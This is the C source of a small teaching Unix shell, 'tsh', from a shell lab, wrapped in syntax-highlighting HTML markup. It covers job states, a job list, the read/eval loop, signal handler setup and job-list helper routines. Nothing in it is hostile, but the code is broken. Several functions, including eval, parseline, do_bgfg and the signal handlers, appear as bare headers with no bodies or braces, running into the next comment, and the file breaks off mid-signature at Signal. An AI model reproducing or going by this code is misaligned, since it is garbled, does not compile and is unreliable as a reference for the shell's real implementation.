class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-comment">/* Misc manifest constants */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXLINE 1024   <span class="hljs-comment">/* max line size */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXARGS 128    <span class="hljs-comment">/* max args on a command line */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJOBS 16     <span class="hljs-comment">/* max jobs at any point in time */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJID 1 &lt;&lt; 16 <span class="hljs-comment">/* max job ID */</span></span><br><br><span class="hljs-comment">/* Job states */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNDEF 0 <span class="hljs-comment">/* undefined */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FG 1    <span class="hljs-comment">/* running in foreground */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BG 2    <span class="hljs-comment">/* running in background */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ST 3    <span class="hljs-comment">/* stopped */</span></span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span><br><span class="hljs-comment"> * Job state transitions and enabling actions:</span><br><span class="hljs-comment"> *     FG -&gt; ST  : ctrl-z</span><br><span class="hljs-comment"> *     ST -&gt; FG  : fg command</span><br><span class="hljs-comment"> *     ST -&gt; BG  : bg command</span><br><span class="hljs-comment"> *     BG -&gt; FG  : fg command</span><br><span class="hljs-comment"> * At most 1 job can be in the FG state.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* Global variables */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;   <span class="hljs-comment">/* defined in libc */</span><br><span class="hljs-keyword">char</span> prompt[] = <span class="hljs-string">&quot;tsh&gt; &quot;</span>; <span class="hljs-comment">/* command line prompt (DO NOT CHANGE) */</span><br><span class="hljs-keyword">int</span> verbose = <span class="hljs-number">0</span>;         <span class="hljs-comment">/* if true, print additional output */</span><br><span class="hljs-keyword">int</span> nextjid = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* next job ID to allocate */</span><br><span class="hljs-keyword">char</span> sbuf[MAXLINE];      <span class="hljs-comment">/* for composing sprintf messages */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span></span><br><span class="hljs-class">&#123;</span>                          <span class="hljs-comment">/* The job struct */</span><br>    <span class="hljs-keyword">pid_t</span> pid;             <span class="hljs-comment">/* job PID */</span><br>    <span class="hljs-keyword">int</span> jid;               <span class="hljs-comment">/* job ID [1, 2, ...] */</span><br>    <span class="hljs-keyword">int</span> state;             <span class="hljs-comment">/* UNDEF, BG, FG, or ST */</span><br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE]; <span class="hljs-comment">/* command line */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> <span class="hljs-title">jobs</span>[<span class="hljs-title">MAXJOBS</span>];</span> <span class="hljs-comment">/* The job list */</span><br><span class="hljs-comment">/* End global variables */</span><br><br><span class="hljs-comment">/* Function prototypes */</span><br><br><span class="hljs-comment">/* Here are the functions that you will implement */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-comment">/* Here are helper routines that we&#x27;ve provided for you */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handler_t</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span></span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * main - The shell&#x27;s main routine </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE];<br>    <span class="hljs-keyword">int</span> emit_prompt = <span class="hljs-number">1</span>; <span class="hljs-comment">/* emit prompt (default) */</span><br><br>    <span class="hljs-comment">/* Redirect stderr to stdout (so that driver will get all output</span><br><span class="hljs-comment">     * on the pipe connected to stdout) */</span><br>    dup2(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">/* Parse the command line */</span><br>    <span class="hljs-keyword">while</span> ((c = getopt(argc, argv, <span class="hljs-string">&quot;hvp&quot;</span>)) != EOF)<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (c)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-comment">/* print help message */</span><br>            usage();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-comment">/* emit additional diagnostic info */</span><br>            verbose = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:            <span class="hljs-comment">/* don&#x27;t print a prompt */</span><br>            emit_prompt = <span class="hljs-number">0</span>; <span class="hljs-comment">/* handy for automatic testing */</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            usage();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* Install the signal handlers */</span><br><br>    <span class="hljs-comment">/* These are the ones you will need to implement */</span><br>    Signal(SIGINT, sigint_handler);   <span class="hljs-comment">/* ctrl-c */</span><br>    Signal(SIGTSTP, sigtstp_handler); <span class="hljs-comment">/* ctrl-z */</span><br>    Signal(SIGCHLD, sigchld_handler); <span class="hljs-comment">/* Terminated or stopped child */</span><br><br>    <span class="hljs-comment">/* This one provides a clean way to kill the shell */</span><br>    Signal(SIGQUIT, sigquit_handler);<br><br>    <span class="hljs-comment">/* Initialize the job list */</span><br>    initjobs(jobs);<br><br>    <span class="hljs-comment">/* Execute the shell&#x27;s read/eval loop */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br><br>        <span class="hljs-comment">/* Read command line */</span><br>        <span class="hljs-keyword">if</span> (emit_prompt)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, prompt);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="hljs-built_in">stdin</span>) == <span class="hljs-literal">NULL</span>) &amp;&amp; ferror(<span class="hljs-built_in">stdin</span>))<br>            app_error(<span class="hljs-string">&quot;fgets error&quot;</span>);<br>        <span class="hljs-keyword">if</span> (feof(<span class="hljs-built_in">stdin</span>))<br>        &#123; <span class="hljs-comment">/* End of file (ctrl-d) */</span><br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* Evaluate the command line */</span><br>        eval(cmdline);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* control never reaches here */</span><br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="hljs-comment"><span class="hljs-function"> * </span></span><br><span class="hljs-comment"><span class="hljs-function"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="hljs-comment"><span class="hljs-function"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="hljs-comment"><span class="hljs-function"> * the user has requested a FG job.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    it immediately.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*****************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * Signal handlers</span></span><br><span class="hljs-comment"><span class="hljs-function"> *****************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     currently running children to terminate.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    to the foreground job.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*</span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*********************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * End signal handlers</span></span><br><span class="hljs-comment"><span class="hljs-function"> *********************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/***********************************************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * Helper routines that manipulate the job list</span></span><br><span class="hljs-comment"><span class="hljs-function"> **********************************************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span><br><span class="hljs-function"></span>&#123;<br>    job-&gt;pid = <span class="hljs-number">0</span>;<br>    job-&gt;jid = <span class="hljs-number">0</span>;<br>    job-&gt;state = UNDEF;<br>    job-&gt;cmdline[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* initjobs - Initialize the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        clearjob(&amp;jobs[i]);<br>&#125;<br><br><span class="hljs-comment">/* maxjid - Returns largest allocated job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, max = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].jid &gt; max)<br>            max = jobs[i].jid;<br>    <span class="hljs-keyword">return</span> max;<br>&#125;<br><br><span class="hljs-comment">/* addjob - Add a job to the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == <span class="hljs-number">0</span>)<br>        &#123;<br>            jobs[i].pid = pid;<br>            jobs[i].state = state;<br>            jobs[i].jid = nextjid++;<br>            <span class="hljs-keyword">if</span> (nextjid &gt; MAXJOBS)<br>                nextjid = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">strcpy</span>(jobs[i].cmdline, cmdline);<br>            <span class="hljs-keyword">if</span> (verbose)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tried to create too many jobs\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* deletejob - Delete a job whose PID=pid from the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        &#123;<br>            clearjob(&amp;jobs[i]);<br>            nextjid = maxjid(jobs) + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].state == FG)<br>            <span class="hljs-keyword">return</span> jobs[i].pid;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobpid  - Find a job (by PID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>            <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobjid  - Find a job (by JID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (jid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].jid == jid)<br>            <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* pid2jid - Map process ID to job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        &#123;<br>            <span class="hljs-keyword">return</span> jobs[i].jid;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* listjobs - Print the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);<br>            <span class="hljs-keyword">switch</span> (jobs[i].state)<br>            &#123;<br>            <span class="hljs-keyword">case</span> BG:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Running &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> FG:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Foreground &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> ST:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stopped &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>,<br>                       i, jobs[i].state);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, jobs[i].cmdline);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/******************************</span><br><span class="hljs-comment"> * end job list helper routines</span><br><span class="hljs-comment"> ******************************/</span><br><br><span class="hljs-comment">/***********************</span><br><span class="hljs-comment"> * Other helper routines</span><br><span class="hljs-comment"> ***********************/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * usage - print a help message</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: shell [-hvp]\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -h   print this message\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -v   print additional diagnostic information\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -p   do not emit a command prompt\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * unix_error - unix-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * app_error - application-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Signal - wrapper for the sigaction function</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> 